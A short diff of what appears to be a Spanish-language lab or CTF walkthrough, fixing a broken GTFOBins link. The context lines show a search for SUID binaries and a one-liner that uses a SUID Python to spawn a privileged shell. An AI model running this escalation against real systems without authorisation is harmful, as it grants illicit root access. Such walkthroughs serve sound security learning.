@@ -121,7 +121,7 @@ jerry@a8385f5ecbd3:~$ find / -perm -4000 2>/dev/null
 /usr/bin/python3.7
 /usr/bin/python3.7m
 ```
-Consultamos [http://https://gtfobins.github.io/](http://https://gtfobins.github.io/) para encontrar una manera de elevar privilegios con Python. Luego, ejecutamos el siguiente comando:
+Consultamos [https://gtfobins.github.io/](https://gtfobins.github.io/) para encontrar una manera de elevar privilegios con Python. Luego, ejecutamos el siguiente comando:
 ```bash
 /usr/bin/python3.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 ```
